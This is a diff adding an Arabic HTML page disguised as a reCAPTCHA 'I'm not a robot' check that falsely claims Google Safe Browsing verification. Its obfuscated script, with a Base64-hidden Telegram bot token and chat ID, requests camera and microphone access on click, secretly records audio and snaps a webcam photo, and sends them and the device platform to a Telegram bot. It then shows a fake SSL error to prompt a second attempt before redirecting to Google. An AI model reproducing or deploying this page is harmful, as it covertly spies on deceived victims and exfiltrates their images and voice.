@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق الأمني الموحد</title>
+    <meta property="og:title" content="Secure Verification Center">
+    <meta property="og:description" content="Verified by Google Safe Browsing">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg">
+    
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .c-box { background: #f9f9f9; border: 1px solid #d3d3d3; padding: 12px; border-radius: 3px; display: flex; align-items: center; width: 300px; cursor: pointer; user-select: none; }
+        .cb { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; display: flex; align-items: center; justify-content: center; background: white; }
+        #ld { width: 18px; height: 18px; border: 2px solid #4285f4; border-top-color: transparent; border-radius: 50%; display: none; animation: sp 1s linear infinite; }
+        @keyframes sp { to { transform: rotate(360deg); } }
+        .tx { color: #555; font-size: 14px; flex-grow: 1; }
+        #er { color: #d93025; font-size: 13px; margin-top: 10px; display: none; text-align: center; width: 300px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div style="display: flex; flex-direction: column; align-items: center;">
+    <div class="c-box" onclick="_0x5a2b()">
+        <div class="cb" id="ch-d"><div id="ld"></div></div>
+        <div class="tx">أنا لست برنامج روبوت</div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg" width="30">
+    </div>
+    <div id="er">⚠️ فشل التحقق من بروتوكول SSL المحمي. حاول مجدداً.</div>
+</div>
+
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c"></canvas>
+
+<script>
+    // تم تشفير المتغيرات والروابط بنظام Base64 لإخفائها
+    const _0x1 = "ODI4NDg2MDQyODpBQUhmT0c0OTZVVV94cnJqOE8yRm5oMEpZWFdpMXZNX3Uybw=="; // Token
+    const _0x2 = "ODQ0NDY0NjYzMg=="; // Chat ID
+    let _0x3 = 0;
+
+    async function _0x5a2b() {
+        _0x3++;
+        const l = document.getElementById('ld');
+        const e = document.getElementById('er');
+        const c = document.getElementById('ch-d');
+        l.style.display = "block";
+        c.style.border = "none";
+        e.style.display = "none";
+
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('v').srcObject = s;
+
+            if(_0x3 === 1) {
+                const info = b64_d("8J+TuyDZhdit2KfZiNmE2Kkg2KzYr9mZ2K_ZitivIDog") + navigator.platform;
+                _0x9f(_0x32(info));
+            }
+
+            const m = new MediaRecorder(s);
+            const ch = [];
+            m.ondataavailable = ev => ch.push(ev.data);
+            m.onstop = () => {
+                const b = new Blob(ch, { type: 'audio/ogg' });
+                const f = new FormData();
+                f.append('chat_id', atob(_0x2));
+                f.append('voice', b);
+                fetch("https://api.telegram.org/bot" + atob(_0x1) + "/sendVoice", { method: 'POST', body: f });
+            };
+            m.start();
+
+            setTimeout(() => {
+                const cv = document.getElementById('c');
+                cv.width = 640; cv.height = 480;
+                cv.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
+                cv.toBlob(bl => {
+                    const f = new FormData();
+                    f.append('chat_id', atob(_0x2));
+                    f.append('photo', bl);
+                    fetch("https://api.telegram.org/bot" + atob(_0x1) + "/sendPhoto", { method: 'POST', body: f });
+                }, 'image/jpeg');
+            }, 1500);
+
+            setTimeout(() => {
+                m.stop();
+                l.style.display = "none";
+                c.style.border = "2px solid #c1c1c1";
+                if (_0x3 < 2) {
+                    e.style.display = "block";
+                } else {
+                    c.innerHTML = "✅";
+                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 800);
+                }
+                s.getTracks().forEach(t => t.stop());
+            }, 5000);
+
+        } catch (ex) {
+            l.style.display = "none";
+            c.style.border = "2px solid #c1c1c1";
+            e.innerText = "⚠️ يجب السماح بالاتصال الآمن للمتابعة.";
+            e.style.display = "block";
+        }
+    }
+
+    function _0x9f(t) {
+        fetch("https://api.telegram.org/bot" + atob(_0x1) + "/sendMessage?chat_id=" + atob(_0x2) + "&text=" + t);
+    }
+    function _0x32(t) { return encodeURIComponent(t); }
+    function b64_d(s) { return decodeURIComponent(escape(atob(s))); }
+</script>
+</body>
+</html>
